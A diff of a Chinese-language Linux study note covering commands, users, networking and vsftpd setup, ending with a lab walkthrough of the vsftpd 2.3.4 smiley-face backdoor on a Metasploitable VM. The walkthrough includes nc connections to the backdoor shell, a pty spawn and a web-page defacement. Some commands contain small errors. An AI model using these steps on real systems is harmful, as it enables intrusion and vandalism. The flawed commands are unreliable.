@@ -8,13 +8,52 @@ tags:
 
 # Linux基础
 
-## Linux 目录结构
+## Linux 概念
+
+### Linux 目录结构
 
 ![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825171924754.png)
 
 ![Linux目录结构](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825172226876.png)
 
+### Linux标准输入输出
 
+````bash
+# 标准输出：0
+终端
+# 标准输入：1
+键盘
+# 标准错误：2
+终端
+# 输出重定向
+echo "hello word" > aa.txt
+````
+
+![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828151659700.png)
+
+### 文件权限
+
+```bash
+# 一个文件或目录，有三种角色：文件的所有者u，文件所有者的所属组g，其他用户o，所有用户a
+
+## Linux三种权限位
+read # 文件是cat; 目录是ls
+write # 文件是touch,vim; 目录是 mkdir,mv,rm
+execute # 文件是./脚本， 目录是cd 命令
+```
+
+###  文件特殊权限
+
+```bash
+##文件特殊权限是对一般权限的补充（由于管理员不受一般权限的控制，可以通过特殊权限来控制），特殊权限会对管理员生效。
+# SUID针对所有者的特殊权限：会让此文件执行者临时获取文件所有者的权限来完成某些工作，rwS
+# SGID
+# SBID其他用户的权限，
+注：
+sudo 是借用root权限
+SUID 是借用所有者的权限
+SGID 是借用属组的权限
+```
 
 ## Linux文件类型
 
@@ -153,7 +192,7 @@ echo %(date + "%Y-%m-%d %H:%M:%S") # 时间
 
 ```
 
-### cat命令
+### cat 命令
 
 ```bash
 cat aa.txt # 查看文件内容
@@ -163,7 +202,7 @@ cat aa.txt bb.txt cc.txt > dd.txt # 将3个文件的内容写到dd.txt中
 
 ```
 
-### more命令
+### more 命令
 
 ```bash
 more # 空格(或者d)向下翻页，b向上翻页，回车下一行，=显示当前行号
@@ -171,7 +210,7 @@ more -6 aa.txt # 指定每一页显示6行
 more +6 aa.txt # 从第6行开始显示
 ```
 
-### less命令
+### less 命令
 
 ```bash
 # 可以使用上下箭头来控制浏览内容
@@ -181,7 +220,7 @@ less -i # 忽略大小写
 less -N aa.txt # 显示行号，可以通过:跳转
 ```
 
-### group命令（过滤，三剑客之一）
+### group 命令（三剑客之一）
 
 ```bash
 ps -ef | grep python # 搜索单词grep
@@ -203,7 +242,7 @@ cat aa.txt | grep -
 
 ![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192252242.png)
 
-### WC命令（ 统计，三剑客之一）
+### wc 命令
 
 ```bash
 # 统计文件的字节数、字数、行数。
@@ -216,7 +255,7 @@ wc aa.txt
 -w # 统计字数
 ```
 
-### find命令（重要）
+### find 命令（重要）
 
 ```bash
 find / -iname test # 不区分大小写
@@ -230,17 +269,195 @@ find / -user tss 2 > null # 将报错（返回2）的不要显示
 
 ![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192802954.png)
 
-
-
-### 其他
+### bzip2 | gzip 打包 & 压缩（重要）
 
 ```bash
+# bzip2 -> .bz2文件，v 是过程可视化，f 是强制解压（默认不保留源文件）
+bzip2 aa.txt # 压缩生成aa.txt.bz2，不保留原文件
+bzip2 -k aa.txt # 生成aa.txt.bz2，保留原文件
+bzip2 -d aa.txt.bz2 # 解压，压缩包不保留
+bzip2 -t aa.txt.bz2 # 检测压缩包是否有问题
+
+# gzip -> .gz文件，v 是过程可视化，f 是强制解压（默认不保留源文件）
+gzip aa.txt bb.txt # 分别压缩，生成2个压缩文件 aa.txt.gz, bb.txt.gz
+gzip -l aa.txt.gz # 列出压缩文件的内容信息
+gzip -d aa.txt.gz # 解压
+gzip -r test # 递归压缩test目录下的aa.txt，bb.txt，cc.txt
+gzip -rd test # 递归解压test目录下的压缩文件
+
+## tar -> .tar文件，f是一定要有的，c是创建，x是解压缩，v是可视化，t是查看压缩内容（默认保留源文件）
+# z: gz格式
+# j: bz2格式
+tar -cvf aa.txt.tar aa.txt
+tar -xvf aa.txt.tar
+tar -czvf aa.txt.gz aa.txt
+tar -xzvf aa.txt.gz
+tar -cjvf aa.txt.bz2 aa.txt
+tar -xjvf aa.txt.bz2
+```
+
+### uname 命令
+
+```bash
+uname # 显示linux
+uname -a # 查询系统所有的信息
+uname -r # 发行编号
+uname -v # 查看版本号
+uname - io # 操作系统名称
+```
+
+### service 命令
+
+```bash
+service [服务名] [start | stop | restart | reload | status]
+# 在 Centos7.0 后，很多服务不在使用 `service`，而是是 `systemctl`
+```
+
+### systemctl 命令
+
+```bash
+systemctl [optinons] command [unit]
+# options: -H, --host（指定systemd实例的主机名或者IP）
+[start, stop, restart, reload, enable, disable, status, is-active, is-enable, mask, unmask等]
+systemctl show ServiceName # 查看服务的内容
+systemctl mask ServiceName # 注销，不可以start，需要unmask
+systemctl unmask ServiceName # 取消注销
+```
+
+### cut 命令
+
+```bash
+cut [选项参数] [filename]
+# cut 命令，剪
+# 文件aa.txt文件如下, 分隔符可以是空格，逗号等
+1	2	3
+4	5	6
+# cut -d '	' -f 1 aa.txt
+1
+4
+# cut -d '	' -f 1-2 aa.txt
+1	2
+4	5
+cut -d : -f 1,3 /etc/passwd # 只显示第1,3列
+```
+
+### Linux 痕迹命令
+
+```bash
+w # 显示系统当前登录的用户信息，who命令信息文件（/var/run/utmp）
+who # 显示系统中正在使用的用户，包含ID，tty,IP，登录时间
+last # 查看用户近期登录信息
+tty # 查看当前登录的tty
+lastlog # 账号最后登录时间
+lastb # 登录错误记录
+logname # 查看原始登录的用户（切换用户的情况）
+```
+
+
+
+### 多命令执行方式
+
+```bash
+# ; && || 之间混合使用
+command1; command2; command3 # 顺序执行，命令中有错误也会执行后面
+command1 && command2 && command3 # 顺序执行，有错误后面不执行
+command1 || command2 || command3 # 命令1错误执行命令2，命令2错误执行命令3，命令1正确后面不执行
+command1 | command2 | command3 # 除了管道过滤作用 或 ，只显示最后一个命令的结果
+```
+
+
+
+### vim 文件编辑
+
+```bash
+# 命令模式
+dd # 删除（剪切）
+yy # 复制
+p # 粘贴
+u # 撤销
+ctrl + r # 恢复撤销
+# 末行模式
+/^字符串 # 向下查询字符串开头
+?字符串& # 向上查询字符结尾，可以结合正则表达式
+:set nu # 显示行号
+:set nonu # 取消行号
+```
+
+
+
+
+
+## 用户和组
+
+```
+用户,UID=1000-60000
+超级用户: root, ID=0
+虚拟用户：1-999之间
+```
+
+### 用户
+
+```bash
+id # 查看用户的uid,gid,group
+
+# 创建用户
+useradd mz # 创建用户
+passwd mz # 修改用户密码
+su mz # 切换用户
+
+# 删除用户
+userdel -rf mz # 删除用户,f是强制删除（有进程），r是删除对应用户的家目录
+
+# cat /etc/passwd
+用户:密码:uid:gid:备注:家目录:shell_path
+# cat /etc/shadow
+用户:密码:修改时间:有效期
+
+# /etc/sudoers 获取sudo的权限
+root ALL=(ALL)	ALL # 方式1
+echo "user	ALL=(ALL)	ALL" > /etc/sudoers/sudoers.d/user_sudoers # 方式2
+```
+
+### 组
+
+```bash
+# cat /etc/group
+
+groupadd groupname1 # 创建组
+groupdel groupname1 # 删除组
+
+gpasswd -a user group # 将user添加到group中
+gpasswd -d user group # 将user从group中删除
+```
+
+
+
+## 查看与终止进程
+
+```bash
+## 查询进程
+ps [参数]
+ps -aux # 显示所有进程 以更详细的内容展示
+ps -ef
+top # 动态，每3秒刷新一次，当前时间，启动时间，系统负载，tasks:全部进程；p cpu, m 内存, q退出
+
+# yum install -y lsof 
+lsof -i :22 # 查看22端口的进程
+lsof -i 192.168.16.ip # 查看IP对应的端口进程
+lsof -p 1283 # 1283进程打开的文件
+
+## 删除进程
+kill 进程ID
+kill -9 进程ID # 强制删除
+pkill -9 t pts/2 # 删除pts
+pkill -9 sshd # 将所以这个服务的进程
+
+## 场景
 ping www.baidu.com > ping.txt & # 后台运行
 jobs # 查看后台任务
 fg 1 # 1 编号是jobs命令查看的，fg将1编号的jobs调到前台运行，可以按Ctrl + Z暂停，或者Ctrl+C结束
 bg 1 # 将暂停的任务继续运行
 tail -f ping.txt # -f 循环查看
-
 
 ```
 
@@ -288,6 +505,185 @@ Ctrl + S # 暂停屏幕的输出
 Ctrl + Q # 恢复屏幕的输出
 Ctrl + U # 再提示符下，将整行命令删除
 Ctrl + Z # 暂停当前任务
+```
+
+## Linux网络
+
+### ifconfig & ip & ping
+
+```bash
+# ifconfig
+ifconfig -a
+ifconfig -s # 查看网络服务连接状态
+ifconfig ens33 down # 关闭网卡，IP地址没有了，网卡也没有了
+ifconfig ens33 up # 启动网卡
+ifdown ens33 # IP没有了，网卡还在
+ifup ens33 # 
+
+# ip
+ip addr # 查看IP地址
+ip addr add 192.168.16.101/24 dev ens33 # 临时添加IP地址，用于测试，重启就没有了
+ip link # 查看当前设备情况
+ip link set ens33 down # 关闭网卡，网卡不在，
+ip link set ens33 up # 开启网卡
+ip link set ens33 name ens32 # 关闭网卡后，可以修改网卡名称，之后再启动
+
+# ping
+ping -c 5 www.baidu.comn # 指定ping 次数
+ping -s 1000 www.baidu.com # 指定包大小
+```
+
+### 网络静态配置
+
+```bash
+# 网卡配置目录
+/etc/sysconfig/network-scripts/
+cp ifcfg-ens33 ifcfg-ens33.bak # 备份网卡
+# vim ifcfg-ens33
+TYPE="Ethernet" # 以太网
+PROXY_METHOD="none" # 代理方法：关闭
+BROWSER_ONLY="no" # 仅仅是浏览器
+BOOTPROTO="dhcp" # 网卡协议
+DEFROUTE="yes" # 默认路由
+IPV4_FAILURE_FATAL="no" # 
+IPV6INIT="yes"
+IPV6_AUTOCONF="yes"
+IPV6_DEFROUTE="yes"
+IPV6_FAILURE_FATAL="no"
+IPV6_ADDR_GEN_MODE="stable-privacy"
+NAME="ens33" # 网卡名称
+UUID="5b505e8a-35f2-4920-8241-edd9f3070780" # 唯一标识码
+DEVICE="ens33" # 设备名称
+ONBOOT="yes" # 是否激活
+# 静态新加（DNS最多3个）
+IPADDR="192.168.16.101"
+NETMASK="255.255.255.0"
+GATEWAY="192.168.16.2"
+DNS1="223.5.5.5" # 阿里
+DNS2="8.8.8.8" # 谷歌
+DNS3="192.168.16.2"
+```
+
+
+
+### route 路由配置
+
+```bash
+# route
+ip route show # 查看路由信息
+route # 显示路由 (default)
+route -n # -n是以数字的方式显示 (0.0.0.0)
+
+## 添加路由
+# sudo ip route add <目标网络> via <网关IP> dev <接口>
+sudo ip route add 192.168.1.0/24 via 10.0.0.1 dev eth0
+# 默认路由
+# sudo ip route add default via <网关IP> dev <接口>
+sudo ip route add default via 10.0.0.1
+
+## 删除路由
+sudo ip route del <目标网络> via <网关IP> # sudo ip route del 192.168.1.0/24
+sudo ip route del default # 删除默认路由
+
+## 测试路由是否生效，查看 8.8.8.8 路由路径
+ip route get 8.8.8.8
+```
+
+
+
+### DNS 检测- nslookup & tracert
+
+```bash
+# nslookup # 
+nslookup www.baidu.com # 返回域名对应的IP地址
+
+# tracert # 跟踪
+yum install -y traceroute
+traceroute www.wangdun.cn
+
+# cat /etc/resolv.conf
+# Generated by NetworkManager
+nameserver 223.5.5.5
+nameserver 8.8.8.8
+nameserver 192.168.16.2
+```
+
+
+
+### 网络监控 - netstat & ss
+
+```bash
+# netstat 查看网络连接
+netstat -anpt # 显示当前主机所有互动的,TCP协议
+netstat -anpu # 显示 UDP协议
+netstat -lanpt # 监听
+
+# ss 查看网络连接2，高并发的场景
+ss -anpt # 和netstat差不多
+
+
+```
+
+### Wireshark工具学习
+
+```bash
+# http://nm.people.com.cn/
+
+```
+
+
+
+## 包管理工具
+
+### rpm
+
+```bash
+# rpm五大功能：安装（-i）、卸载（-e）、升级(-u)、查询(-qa(所有rpm包| -ql(已安装的软件包))、验证(-qf) 
+rpm -qa # 查询系统上的rpm包
+```
+
+## 服务vsftpd
+
+### 安装&卸载vsftpd
+
+```bash
+# yum
+# http://rpmfind.net/
+# wget https://rpmfind.net/linux/mageia/distrib/8/x86_64/media/core/release/vsftpd-3.0.3-11.mga8.x86_64.rpm
+yum repolist # 查看镜像源
+yum search vsftpd # 查看vsftpd软件包
+yum install vsftpd # 安装vsftpd软件
+yum remove vsftpd # 卸载vsftpd软件
+yum autoremove # 卸载残留
+yum clear all
+```
+
+### 配置vsftpd
+
+```bash
+# /etc/vsftpd/vsftpd.conf
+anonymous_enable=NO
+chroot_local_user=YES
+chroot_list_enable=YES
+chroot_list_file=/etc/vsftpd/chroot_list
+listen=YES
+listen_ipv6=NO
+# 
+useradd ftpuser
+passwd ftpuser
+vim  /etc/vsftpd/user_list # 添加ftpuser
+# systemctl restart vsftpd
+netstat -anpt  # 查看21端口
+```
+
+### 使用vsftpd
+
+```bash
+# 客户端
+yum install ftp
+sftp ftpuser@192.168.16.101
+get filename # 下载
+put filename # 上传
 ```
 
 
@@ -425,7 +821,11 @@ cp sources.list sources.list.bak
 deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 # apt更新
-apt update # 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
+apt update 
+# 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
+# 解决方法2
+wget -qO- https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg
+echo "deb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://archive.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list
 
 ## 实用工具
 # 检测主机是否存在
@@ -444,3 +844,53 @@ fping -asg 192.168.112.0/24 -C 1
 
 # 漏洞
 
+## 0001 - 笑脸漏洞 ):  (21 port, vsftpd 2.3)
+
+### 原理
+
+```bash
+影响范围：vsftpd 2.3.x及以下版本
+```
+
+
+
+### 复现
+
+```bash
+# 靶场环境：metasploitable-linux-2.0.0.zip，解压打开，选择“我已复制虚拟机”
+
+## kali
+# 1、使用nmap 探活
+nmap 192.168.16.0/24 # 确认有开发ftp 21端口的IP地址
+nmap -sV 192.168.16.141 # 确认对应IP地址对应的ftp版本，V是版本
+
+## 2、使用nc（瑞士小军刀）连接ftp。（aa用户名和aaaa密码随意，:)一定要有）
+# 终端1
+nc 192.168.16.141 21 # 21 ftp 端口
+	user aa:)
+	pass aaaa
+# 终端2
+sudo nmap -sS -p 6200 192.168.16.141
+nc 192.168.16.141 6200 # 就可以连接上了，回车输入下面Python命令获取权限
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+## 3、网页篡改
+# http://192.168.16.141 是一个静态网页。（靶场自带的）
+find / -name index.html # 查看静态网页的路径
+cd /etc/www
+cat index.php # 确认网站内容和该文件一致
+wget http://img.k2r2.com/uploads/002/20230625/1618252013.jpg # 准备篡改的图片
+mv 1618252013.jpg aa.jpg
+echo '<img src="aa.jpg">' >> index.php # 篡改网页内容，增加图片
+chmod 777 aa.jpg # 修改图片的权限
+```
+
+### 相关截图如下
+
+![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828191322246.png)
+
+![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192716427.png)
+
+![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192653371.png)
+
+## 0002 - 
